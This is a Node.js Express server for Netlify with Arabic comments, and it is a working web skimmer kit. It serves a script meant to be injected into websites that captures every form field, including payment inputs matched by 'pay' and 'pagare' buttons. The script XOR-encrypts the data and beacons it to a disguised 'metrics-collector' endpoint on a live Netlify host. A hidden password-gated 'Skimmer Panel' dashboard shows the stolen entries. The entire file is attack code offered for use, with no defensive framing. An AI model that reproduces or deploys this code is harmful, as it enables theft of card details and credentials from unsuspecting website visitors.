const express = require("express");
const serverless = require("serverless-http");
const app = express();

// ======================== التخزين المؤقت (للتجربة) ========================
let logs = [];

// ======================== فك تشفير XOR + Base64 ========================
function decrypt(data) {
    try {
        const decoded = Buffer.from(data, "base64").toString();
        let key = 0x42;
        let result = "";
        for (let i = 0; i < decoded.length; i++) {
            result += String.fromCharCode(decoded.charCodeAt(i) ^ key);
            key = (key + 1) & 0xFF;
        }
        return JSON.parse(result);
    } catch (e) {
        return null;
    }
}

// ======================== نقطة استقبال البيانات (المسار الشبح) ========================
app.all("/v1/api/metrics-collector", (req, res) => {
    let payload = req.query.d || req.body.d;
    if (payload) {
        const data = decrypt(payload);
        if (data) {
            logs.unshift({ time: new Date().toISOString(), data });
        }
    }
    const img = Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64");
    res.writeHead(200, { "Content-Type": "image/gif" }).end(img);
});

// ======================== لوحة التحكم المخفية ========================
app.get("/dashboard", (req, res) => {
    if (req.query.admin !== "bakeel") {
        return res.status(404).send("Not Found");
    }
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Skimmer Panel</title>
            <style>
                body { background:#000; color:#0f0; font-family:'Courier New',monospace; padding:20px; }
                h1 { color:#0f0; border-bottom:1px solid #0f0; display:inline-block; }
                .log { border-bottom:1px dashed #0f0; margin:5px 0; padding:5px; word-break:break-all; }
                button { background:#000; color:#0f0; border:1px solid #0f0; padding:8px 16px; cursor:pointer; }
                button:hover { background:#0f0; color:#000; }
                #logs { margin-top:20px; }
            </style>
        </head>
        <body>
            <h1>⚡ SKIMMER PANEL vX.2</h1>
            <button onclick="refreshLogs()">REFRESH</button>
            <hr>
            <div id="logs"></div>
            <script>
                function refreshLogs() {
                    fetch('/data?admin=bakeel')
                        .then(r => r.json())
                        .then(data => {
                            const container = document.getElementById('logs');
                            container.innerHTML = data.map(entry => '<div class="log">[' + entry.time + '] ' + JSON.stringify(entry.data) + '</div>').join('');
                        })
                        .catch(console.error);
                }
                refreshLogs();
                setInterval(refreshLogs, 3000);
            </script>
        </body>
        </html>
    `);
});

// ======================== نقطة جلب البيانات للوحة التحكم ========================
app.get("/data", (req, res) => {
    if (req.query.admin !== "bakeel") return res.status(404).send("Not Found");
    res.json(logs);
});

// ======================== السكريبت الرئيسي الذي سيُحقن في الموقع ========================
app.get("/s", (req, res) => {
    res.set("Content-Type", "application/javascript");
    const mainScript = `
(function() {
    const XOR_KEY_START = 0x42;
    function encrypt(data) {
        const json = JSON.stringify(data);
        let encoded = "";
        let key = XOR_KEY_START;
        for (let i = 0; i < json.length; i++) {
            encoded += String.fromCharCode(json.charCodeAt(i) ^ key);
            key = (key + 1) & 0xFF;
        }
        return btoa(encoded);
    }
    const ENDPOINT = 'https://69c92280e51acb22ad72b07a--loquacious-fairy-f87d48.netlify.app/v1/api/metrics-collector';
    const MAX_URL_LEN = 1800;
    function send(data) {
        const payload = { ...data, ts: Date.now(), url: location.href };
        const encrypted = encrypt(payload);
        const fullUrl = ENDPOINT + '?d=' + encodeURIComponent(encrypted);
        if (fullUrl.length <= MAX_URL_LEN) {
            new Image().src = fullUrl;
        } else {
            const chunkSize = MAX_URL_LEN - ENDPOINT.length - 10;
            for (let i = 0; i < encrypted.length; i += chunkSize) {
                new Image().src = ENDPOINT + '?d=' + encodeURIComponent(encrypted.slice(i, i + chunkSize));
            }
        }
        if (navigator.sendBeacon) {
            navigator.sendBeacon(ENDPOINT, new URLSearchParams({ d: encrypted }));
        }
    }
    function collectFields() {
        const fields = {};
        document.querySelectorAll('input:not([type=hidden]), select, textarea').forEach(el => {
            if (el.value && el.value.trim()) {
                const name = el.placeholder || el.name || el.id || el.type;
                fields[name] = el.value;
            }
        });
        return fields;
    }
    let sendTimer = null;
    function debouncedSend(data) {
        if (sendTimer) clearTimeout(sendTimer);
        sendTimer = setTimeout(() => { send(data); sendTimer = null; }, 800);
    }
    function monitorInputs() {
        document.querySelectorAll('input:not([type=hidden]), select, textarea').forEach(el => {
            if (el._mon) return;
            el._mon = true;
            el.addEventListener('input', () => debouncedSend({ type: 'input', fields: collectFields() }));
            el.addEventListener('blur', () => send({ type: 'blur', fields: collectFields() }));
        });
    }
    function monitorSubmit() {
        document.querySelectorAll('button, input[type="submit"]').forEach(btn => {
            if (btn._sub) return;
            btn._sub = true;
            const txt = (btn.innerText || btn.value || '').toLowerCase();
            if (/pagare|pay|دفع|شراء|submit/.test(txt)) {
                btn.addEventListener('click', () => send({ type: 'submit', fields: collectFields() }));
            }
        });
    }
    let started = false;
    function start() {
        if (started) return;
        started = true;
        monitorInputs();
        monitorSubmit();
        setInterval(() => { monitorInputs(); monitorSubmit(); }, 5000);
    }
    if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', start);
    else start();
    const observer = new MutationObserver(() => { monitorInputs(); monitorSubmit(); });
    observer.observe(document.body, { childList: true, subtree: true });
})();
    `;
    res.send(mainScript);
});

// ======================== المسار الرئيسي ========================
app.get("/", (req, res) => {
    res.send("System ready.");
});

// ======================== تصدير الـ handler لـ Netlify ========================
module.exports.handler = serverless(app);
